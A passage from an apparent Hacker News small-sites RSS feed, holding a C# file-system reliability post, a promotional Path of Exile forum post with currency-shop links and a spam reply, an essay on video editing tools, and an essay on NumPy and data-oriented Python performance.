        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span> <span>catch</span> <span>(</span><span>FileNotFoundException</span><span>)</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This implementation provides the original requested behavior. In the case the file exists, for the duration of the operation, it returns the text of the file and if not returns an empty string.</p>

<p>In general I find the above pattern is the best way to approach the file system. Do the operations you want and deal with the consequences of failure in the form of exceptions. To do anything else involves an unreliable prediction in which you still must handle the resulting exceptions.</p>

<p>If this is the case then why have File.Exist at all if the results can‚Äôt be trusted‚Äô It depends on the level of reliability you want to achieve. In production programs I flag any File.Exist I find as a bug because reliability is a critical component. However you‚Äôll see my personal powershell configuration scripts littered with calls to File.Exsit. Simply put because I‚Äôm a bit lazy in those scripts because critical reliability is not important when I‚Äôm updating my personal .vimrc file.</p>


    </div></div>]]>
            </description>
            <link>https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512405</guid>
            <pubDate>Fri, 18 Sep 2020 02:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Path of Exile (Poe) Is a Worth Playing MMO ‚Äì Five Reasons to Explain That]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24512371">thread link</a>) | @ChrisPineson
<br/>
September 17, 2020 | https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/ | <a href="https://web.archive.org/web/*/https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>You need to log in to create posts and topics.</p><div id="postid-1170"><div><div><p><a href="http://www.google.ae/url?q=https://eznpc.com/poe-currency"><img title="" src="https://lh3.googleusercontent.com/YpEB1sT8hT6WU2pqviNhZVrv6z-WZp3Z6jvQnf_j6nkLccp6FsKfkM_CqLaPX1rjOuTZsYJuwQAehpJYYBDm1N-aSyseDP6it2c2QZEibf9VkuK8d9dRWChdbapahCFE8WTwmo89CVw6CGxhBy76bWA9zFNrpcxoSdlLWvFLZZG0kDuQPClDlAGcvYcMj2pZs2we9cpCYY7VgjJo2hLGlltKfNtcYDvxGhkEGJn9zXeUstBfQ7c3Nx-E04j3as71baOyd1W4IrJ1S3UIw82ppje4TXzKmkZDfK2rsHuSMpKayTpt6mQ-MJYtJuwbTpmaDm589Wg03sIu7SttnBMEFSjoesCWSJ6RLTOm0nQzK2lo4np3VlaMU0pdjLYVU0t_uEpLp8iG-R7YSHep-wwCo5MQriXBxdy8N6tILdDT-Lk8xWc239hh9OPc3tMie1cJwk2MNX6QPFQjmeTDy6XDnrmJQOhiYxzx3AV_vmdt1bC0rmeDDdkHu0CLX87B_vLwTGxMYGxGe-bvKkHMGK9YbprrJOkphF-P88nDl5oZnQHwz4HdCuEGh5MsSpK-01JGce3Ghozj1h6aM99t0cAaY2WishVRakVfcfyvYBNSVwoCziSqnmztk-TVa50oQN-npAq3aAdkOvZ-hUqXsmGg8AsMwDaBbWntxJklPwNoA6tSrxCz52GS7EHO96Sp=w657-h329-no?authuser=0" alt="Why You Should Play Path of Exile" width="657" height="328"></a>As we all know the Path of Exile has been available for a very quite long time. Several days ago, they just launched their brand new and Free Delirium Expansion which concentrate on sending players off the grid to carve out a brand new section with passive skill and then encounter the worst nightmares over there and finally let players earn <a href="https://eznpc.com/poe-chaos-orb">PoE orbs</a>&nbsp;and Path of Exile Currency after finish this expansion successfully. Needless to say, a lot of unexpected things are certainly going on in this game. If you are now thinking of turning away from this game just because of the way it looks or the way it feels, then we recommend you to not do it! Cause, in fact, Path of Exile is a quite great ARPG (Action Role-Playing Game) that really deserves the praise and accolades it get from the online gaming community and now, here are five reasons for you to at least consider trying this out!</p>
<p>The very first one is: <strong>This Game Is Free To Play</strong></p>
<p>Who does not like Free Games? Even better, who does not like Free Games that are really excellent? Though Path of Exile offers some optional microtransactions (they have to earn money one way or the other after all), this game is totally free to download and play! Of course, it got off to a quite difficult start when the developer Grinding Gear Game (GGG) launched it firstly, but with tons of expansions, tweaks, and feedback from players, this game has improved drastically and now holds the torch as the best action role-playing video games to date. I have to admit that this game has set the standard that every other game of the same genre should follow!</p>
<p>The second one is: <strong>This Game Has Tons Of Content</strong></p>
<p>Here comes the question, if there's just one thing that Path of Exile is famous for, what would that be? For me, I might answer, that's the vast amount of content PoE has available. This game now has been successfully out for eight years, which means that it's packed full of great content. Though the developer Grinding Gear Games (GGG) has a reputation of sometimes rushing content (the Betrayal League is a great example of that) filled with glaring errors, the fact of the matter is you will be spoiled with so much stuff to do. And you have to admit that most of their expansions are top-notch, and you can sink your teeth into this endgame content easily for hours.</p>
<p>The third one is: <strong>This Game Has Awesome Developer Support</strong></p>
<p>The developer Grinding Gear Games (GGG) of Path of Exile, is always dedicated to continuously improving their game. They are always pushing for updates, from some minor patches every month to some big ones named Leagues. These Leagues give brand new methods to play this game, new loot to discover, and new skin to collect. If that's not enough to entice you into trying out Path of Exile, these Leagues come about 3-4 months! And the developer Grinding Gear Games (GGG) seems to want to ensure that their beloved game lasts forever, therefore, they consistently find unique methods to innovate upon what's have already there. Anyway, there's always something to look forward to!</p>
<p>The fourth one is: <strong>Guide Are Always Available In Path Of Exile</strong></p>
<p>Are you have trouble when choosing which melee equipment you need to use? Or maybe you are a little confused about the skill tree's use? You can find guides all over the Internet pretty easily, and that is mainly thanks to the tight-knit Path of Exile community! Wiki builds are abundant and new guides pop up almost every day. Whether it is a YouTube video to help you with power leveling or just in-depth written guides about all of the expansions, you should know there are plenty of guides to make your Exile in Wraeclast so much easier than before.</p>
<p>The community of Path of Exile is just insanely helpful, particularly to those new starters who are just figuring out this game. It's difficult to find fun games anymore as most are filled with toxicity (checking out League of Legends and DOTA 2). Here people will welcome you with just open arms, and if you are coming from games that are plagued with those toxic communities, then you will be taken aback by how nice everybody is on Path of Exile.</p>
<p>The fifth one is: <strong>This Is A Unique Game</strong></p>
<p>As you know, in most RPGs (Role-Playing Games), you just need to pick a class and the designate skill points to whichever stats you want to increase. Generally, you are just locked into a particular style of play. That is not the case in Path of Exile. Your skills and abilities are just linked to skill gems that are socketed into your very own gear, from your helmet to your boots. And now these gems will apply different abilities to your gear just depending on which you select. Path of Exile pushes players to personalize their own characters with the help of the massive skill tree and hundreds of gems to choose from. No role-playing game has ever implemented this kind of customization yet, making Path of Exile a quite unique experience unlike any other.</p>
<p>And above are our five reasons why you should start playing Path of Exile. Okay now, have we already convinced you to try and farm some rare items such as PoE orbs and <a href="https://eznpc.com/poe-currency">buy PoE currency online</a>&nbsp;for fun? If you are not, just post your comments down below and let us know why.</p>
</div>    </div>
</div><div id="postid-1181"><div><p><img alt="" src="https://secure.gravatar.com/avatar/bae48a4fafec9af9cb0512fbed819bc0?s=120&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/bae48a4fafec9af9cb0512fbed819bc0?s=240&amp;d=mm&amp;r=g 2x" height="120" width="120"></p><div><p><span><a href="https://www.awow-tech.com/forum/profile/dreamzweddingplanner2/">dreamzweddingplanner2</a></span><span>(@dreamzweddingplanner2)</span></p></div><p><small>3 Posts</small></p></div><div><div><p>looking for the Best wedding or an event planner to Organize a wedding or a party in udaipur, delhi, agra, India</p>
<p><a href="https://www.dreamzweddingplanner.com/services/wedding-planning/">Event planner</a></p>
</div>    </div>
</div></div>]]>
            </description>
            <link>https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512371</guid>
            <pubDate>Fri, 18 Sep 2020 02:34:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why is video editing so horrible today?]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512292">thread link</a>) | @pavel_lishin
<br/>
September 17, 2020 | https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/ | <a href="https://web.archive.org/web/*/https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main id="genesis-content"><article itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text"><p>Reading Time: 5 minutes read</p>




<p>In the last three months, I have done more video post-production than I have done in the past 12 years. Surprisingly, in these years, nothing seems to have changed. Considering how much media is now machine analyzable content, such as audio and visual, I‚Äôm surprised there aren‚Äôt more patterns that make navigating and arranging video content faster. Beyond that, I‚Äôm surprised there isn‚Äôt more process for programmatically composing video in a polished complimentary way to the existing manual methods of arranging.</p>



<p>In 1918, when the video camera was created, if you filmed something and wanted to edit it, you took your footage, cut it and arranged it according to how you wanted it to look. Today, if you want to edit a video, you have to import the source assets into a specialty program (such as Adobe Premiere), and then manually view each item to watch/listen for the portion that you want. Once you have the sections of each imported asset, you have to manually arrange each item on a timeline. Of course a ton has changed, but the general workflow feels the same.</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/editing._D18377.jpg?resize=379%2C395&amp;ssl=1" alt="Should Critics and Festivals Give Editing Awards? Yes, and Here's Why |  IndieWire" width="379" height="395" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/editing._D18377.jpg?resize=379%2C395&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Real life photo of me navigating my Premiere assets folders</figcaption></figure></div>



<p>How did video production and editing not get its digital-first methods of creation? Computing power has skyrocketed. Access to storage is generally infinite. And our computers are networked around the world. How is it that the workflow of import, edit, and export take so long?</p>



<p>The consumerization of video editing has simplified certain elements by abstracting away seemingly important but complicated components, such as the linearity of time. Things like Tiktok seem to be the most dramatic shift in video creation, in that the workflow shifts from immediate review and reshooting of video. Over the years, the iMovies and such have moved timelines, from horizontal representation of elapsed time into general blocks of ‚Äúscenes‚Äù or clips. The simplification through abstraction is important for the general consumer, but reduces the attention to detail. This creates an aesthetic of its own, which seems to be the result of the changing of tools. </p>



<p>Where are all the things I take for granted in developer tools, like autocomplete or class-method search, in the video equivalent? What is autocomplete look like in editing a video clip? Where are the repeatable ‚Äúpatterns‚Äù I can write once, and reuse everywhere? Why does each item on a video canvas seem to live in isolation from one another, with no awareness of other elements or an ability to interact with each other?</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=352%2C175&amp;ssl=1" alt="" width="352" height="175" srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=1024%2C513&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=768%2C385&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?zoom=2&amp;resize=352%2C175&amp;ssl=1 704w" sizes="(max-width: 352px) 100vw, 352px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=1024%2C513&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=768%2C385&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?zoom=2&amp;resize=352%2C175&amp;ssl=1 704w" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=352%2C175&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>My code editor searches my files and tried to ‚Äúimport‚Äù the methods when I start typing.</figcaption></figure></div>



<p>As someone who studied film and animation exclusively for multiple years, I‚Äôm generally surprised that the overall ways of producing content are largely the same as they have been 10 years ago, but also seemingly for the past 100.</p>



<p>I understand that the areas of complexity have become more niche, such as in VFX or multi-media. I have no direct experience with any complicated 3D rendering and I haven‚Äôt tried any visual editing for non-traditional video displays, so its a stretch to say film hasn‚Äôt changed at all. I haven‚Äôt touched the surface in new video innovation, but all considering, I wish some basic things were much easier.</p>



<p>For one, when it comes to visual layout, I would love something like the Figma ‚Äúautolayout‚Äù functionality. If I have multiple items in a canvas, I‚Äôd like them to self-arrange based on some kind of box model. There should be a way to assign the equivalent of styles as ‚Äúclasses‚Äù, such as with CSS, and multiple text elements should be able to inherit/share padding/margin definitions. Things like flexbox and relative/absolute positioning would make visual templates significantly much easier and faster for developing fresh video content.</p>



<div><figure><img src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=368%2C157&amp;ssl=1" alt="" width="368" height="157" srcset="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1024%2C438&amp;ssl=1 1024w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=300%2C128&amp;ssl=1 300w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=768%2C328&amp;ssl=1 768w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1536%2C656&amp;ssl=1 1536w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=2048%2C875&amp;ssl=1 2048w" sizes="(max-width: 368px) 100vw, 368px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1024%2C438&amp;ssl=1 1024w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=300%2C128&amp;ssl=1 300w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=768%2C328&amp;ssl=1 768w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1536%2C656&amp;ssl=1 1536w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=2048%2C875&amp;ssl=1 2048w" data-lazy-src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=368%2C157&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Currently I make visual frames in Figma, then export them because its so much easier than fumbling through the 2D translations in Premiere</figcaption></figure></div>



<p>I would love to have a ‚Äúsmarter‚Äù timeline that can surface ‚Äúcues‚Äù that I may want to hook into for visual changes. The cues could make use of machine analyzable features in the audio and video, based on features detected in the available content. This is filled with lots of hairy areas, and definitely sounds nicer than it might be in actuality. At a basic example, the timeline could look at audio or a transcript and know when a certain speaker is talking. There are already services, such as Descript, that make seamless use of speaker detection. That should find some expression in video editing software. Even if the software itself doesn‚Äôt detect this information, the metadata from other software should be made use of.</p>



<figure><img src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1" alt="" srcset="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1 1024w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=300%2C230&amp;ssl=1 300w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=768%2C589&amp;ssl=1 768w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?w=1256&amp;ssl=1 1256w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1 1024w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=300%2C230&amp;ssl=1 300w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=768%2C589&amp;ssl=1 768w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?w=1256&amp;ssl=1 1256w" data-lazy-src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The two basic views in Zoom. Grid or speaker.</figcaption></figure>



<p>More advanced would be to know when certain exchanges between multiple people are a self-encompassed ‚Äúpoint‚Äù. Identifying when a ‚Äúexchange‚Äù takes place, or when a ‚Äúquestion‚Äù is ‚Äúanswered‚Äù, would be useful for title slides or lower-thirds with complimentary text.</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=350%2C255&amp;ssl=1" alt="" width="350" height="255" srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=1024%2C746&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=300%2C218&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=768%2C559&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?w=1450&amp;ssl=1 1450w" sizes="(max-width: 350px) 100vw, 350px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=1024%2C746&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=300%2C218&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=768%2C559&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?w=1450&amp;ssl=1 1450w" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=350%2C255&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Descript will identify speakers and color code the transcript.</figcaption></figure></div>



<p>If there are multiple shots of the same take, it would be nice to have the clips note where the beginning and end based on lining up the audio. Reviewing content shouldn‚Äôt be done in a linear fashion if there are ways to distinguish content of video/audio clip and compare it to itself or other clips.</p>



<p>In line with ‚Äúcues‚Äù, I would like to ‚Äúsearch‚Äù my video in a much more comprehensive way. My iPhone photos app lets me search by faces or location. How about that in my video editor? All the video clips with a certain face or background?</p>



<p>Also, it would be nice to generate these ‚Äúfeatures‚Äù with some ease. I personally dont know what it would take to train a feature detector by viewing some parts of a clip, labeling it, and then using the labeled example to find the other instances of similar kinds of visual content. I do know its possible, and that would be very useful for speeding up the editing process.</p>



<p>In my use case, I‚Äôm seeing a lot of video recordings of Zoom calls or webinars. This is another example of video content that generally looks the ‚Äúsame‚Äù and could be analyzed for certain content types. I would be able to quickly navigate through clips if I could be able to filter video by when the video is a screen of many faces viewed at once, or when only one speaker is featured at a time. </p>



<p>All of this to say, there is a lot of gaps in the tools available at the moment.</p>

</div></article></main></div></div></div>]]>
            </description>
            <link>https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512292</guid>
            <pubDate>Fri, 18 Sep 2020 02:20:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Oriented Programming in Python]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24511966">thread link</a>) | @brilee
<br/>
September 17, 2020 | https://www.moderndescartes.com/essays/data_oriented_python/ | <a href="https://web.archive.org/web/*/https://www.moderndescartes.com/essays/data_oriented_python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
	

<p> Originally posted 2020-09-13</p>
<p> Tagged: <a href="https://www.moderndescartes.com/essays/tags/optimization">optimization</a>, <a href="https://www.moderndescartes.com/essays/tags/computer_science">computer_science</a>, <a href="https://www.moderndescartes.com/essays/tags/python">python</a></p>
<p> <em>Obligatory disclaimer: all opinions are mine and not of my employer </em></p>
<hr>

<p>Many users of Python deprioritize performance in favor of soft benefits like ergonomics, business value, and simplicity. Users who prioritize performance typically end up on faster compiled languages like C++ or Java.</p>
<p>One group of users is left behind, though. The scientific computing community has lots of raw data they need to process, and would very much like performance. Yet, they struggle to move away from Python, because of network effects, and because Python‚Äôs beginner-friendliness is appealing to scientists for whom programming is not a first language. So, how can Python users achieve some fraction of the performance that their C++ and Java friends enjoy?</p>
<p>In practice, scientific computing users rely on the NumPy family of libraries e.g.&nbsp;NumPy, SciPy, TensorFlow, PyTorch, CuPy, JAX, etc.. The sheer proliferation of these libraries suggests that the NumPy model is getting something right. In this essay, I‚Äôll talk about what makes NumPy so effective, and where the next generation of Python numerical computing libraries (e.g.&nbsp;TensorFlow, PyTorch, JAX) seems to be headed.</p>
<h2 id="data-good-pointers-bad">Data good, pointers bad</h2>
<p>A pesky fact of computing is that computers can compute far faster than we can deliver data to compute on. In particular, data transfer <em>latency</em> is the Achille‚Äôs heel of data devices (both RAM and storage). Manufacturers disguise this weakness by emphasizing improvements in data transfer <em>throughput</em>, but latency continues to stagnate. Ultimately, this means that any chained data access patterns, where one data retrieval must be completed before the next may proceed, are the worst case for computers.</p>
<p>These worst-case chained data access patterns are unfortunately quite common ‚Äì so common that they have a name you may be familiar with: a pointer.</p>
<p>Pointers have always been slow. In the ‚Äô80s and ‚Äô90s, our hard drives were essentially optimized record players, with a read head riding on top of a spinning platter. These hard drives had physical limitations: The disk could only spin so fast without shattering, and the read head was also mechanical, limiting its movement speed. Disk seeks were slow, and the programs that were most severely affected were databases. Some ways that databases dealt with these physical limitations are:</p>
<ul>
<li>Instead of using binary trees (requiring <span>\(\log_2 N\)</span> disk seeks), B-trees with a much higher branching factor <span>\(k\)</span> were used, only requiring <span>\(\log_k N\)</span> disk seeks.</li>
<li>Indices were used to query data without having to read the full contents of each row.</li>
<li>Vertically-oriented databases optimized for read-heavy workloads (e.g.&nbsp;summary statistics over one field, across entire datasets), by reorganizing from <a href="https://en.wikipedia.org/wiki/AoS_and_SoA">arrays of structs to structs of arrays</a>. This maximized effective disk throughput, since no extraneous data was loaded.</li>
</ul>
<p>Today, compute speed is roughly <span>\(10^5 - 10^6\)</span> times faster than in 1990. Today, RAM is roughly <span>\(10^5\)</span> times faster than HDDs from 1990. I was amused and unsurprised to find that Raymond Hettinger‚Äôs <a href="https://www.youtube.com/watch?v=npw4s1QTmPg">excellent talk on the evolution of Python‚Äôs in-memory <code>dict</code> implementation</a> plays out like a brief history of early database design. Time, rather than healing things, has only worsened the compute-memory imbalance.</p>
<h2 id="numpys-optimizations">NumPy‚Äôs optimizations</h2>
<h3 id="boxing-costs">Boxing costs</h3>
<p>In many higher-level languages, raw data comes in boxes containing metadata and a pointer to the actual data. In Python, the PyObject box holds reference counts, so that the garbage collector can operate generically on all Python entities.</p>
<p>Boxing creates two sources of inefficiency:</p>
<ul>
<li>The metadata bloats the data, reducing the data density of our expensive memory.</li>
<li>The pointer indirection creates another round trip of memory retrieval latency.</li>
</ul>
<p>A NumPy array can hold many raw data within a single PyObject box, <em>provided that all of those data are of the same type</em> (int32, float32, etc.). By doing this, NumPy amortizes the cost of boxing over multiple data.</p>
<p>In <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">my previous investigations into Monte Carlo tree search</a>, a naive UCT implementation performed poorly because it instantiated millions of UCTNode objects whose sole purpose was to hold a handful of float32 values. In the optimized UCT implementation, these nodes were replaced with NumPy arrays, reducing memory usage by a factor of 30.</p>
<h3 id="attribute-lookup-function-dispatch-costs">Attribute lookup / function dispatch costs</h3>
<p>Python‚Äôs language design forces an unusually large amount of pointer chasing. I mentioned boxing as one layer of pointer indirection, but really it‚Äôs just the tip of the iceberg.</p>
<p>Python has no problem handling the following code, even though each of these multiplications invokes a completely different implementation.</p>
<pre><code>&gt;&gt;&gt; mixed_list = [1, 1.0, 'foo', ('bar',)]
&gt;&gt;&gt; for obj in mixed_list:
...     print(obj * 2)

2
2.0
'foofoo'
('bar', 'bar')</code></pre>
<p>Python accomplishes this with a minimum of two layers of pointer indirection:</p>
<ol type="1">
<li>Look up the type of the object.</li>
<li>Look up and execute the <code>__mul__</code> function from that type‚Äôs operation registry.</li>
</ol>
<p>Additional layers of pointer indirection may be required if the <code>__mul__</code> method is defined on a superclass: the chain of superclasses must be traversed, one pointer at a time, until an implementation is found.</p>
<p>Attribute lookup is similarly fraught; <code>@property</code>, <code>__getattr__</code>, and <code>__getattribute__</code> provide users with flexibility that incurs pointer chasing overhead with something as simple as executing <code>a.b</code>. Access patterns like <code>a.b.c.d</code> create exactly the chained data access patterns that are a worst-case for data retrieval latency.</p>
<p>To top it all off, merely <em>resolving</em> the object is expensive: there‚Äôs a stack of lexical scopes (local, nonlocal, then global) that are checked in order to find the variable name. Each check requires a dictionary lookup, another source of pointer indirection.</p>
<p>As the saying goes: ‚ÄúWe can solve any problem by introducing an extra level of indirection‚Ä¶ except for the problem of too many levels of indirection‚Äù. The NumPy family of libraries deals with this indirection, not by removing it, but again by sharing its cost over multiple data.</p>
<pre><code>&gt;&gt;&gt; homogenous_array = np.arange(5, dtype=np.float32)
&gt;&gt;&gt; multiply_by_two = homogenous_array * 2
&gt;&gt;&gt; print(multiply_by_two)
array([ 0.,  2.,  4.,  6.,  8.], dtype=float32)</code></pre>
<p>Sharing a single box for multiple data allows NumPy to retain the expressiveness of Python while minimizing the cost of the dynamism. As before, this works because of the additional constraint that all data in a NumPy array must have identical type.</p>
<h2 id="the-frontier-jit">The Frontier: JIT</h2>
<p>So far, we‚Äôve seen that NumPy doesn‚Äôt solve any of Python‚Äôs fundamental problems when it comes to pointer overhead. Instead, it merely puts a bandaid on the problem by sharing those costs across multiple data. It‚Äôs a pretty successful strategy ‚Äì in my hands (<a href="https://www.moderndescartes.com/essays/vectorized_pagerank">1</a>, <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">2</a>), I find that NumPy can typically achieve 30-60x speedups over pure Python solutions to dense numerical code. However, given that C code typically achieves <a href="https://www.moderndescartes.com/essays/data_oriented_python/(https://benchmarksgame-team.pages.debian.net/benchmarksgame/fastest/python3-gcc.html)">100-200x performance</a> over pure Python on dense numerical code (common in scientific computing), it would be nice if we could further reduce the Python overhead.</p>
<p>Tracing <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">JITs</a> promise to do exactly this. Roughly, the strategy is to trace the execution of the code and record the pointer chasing outcomes. Then, when you call the same code snippet, reuse the recorded outcomes! NumPy amortizes Python overhead over multiple data, and JIT amortizes Python overhead over multiple function calls.</p>
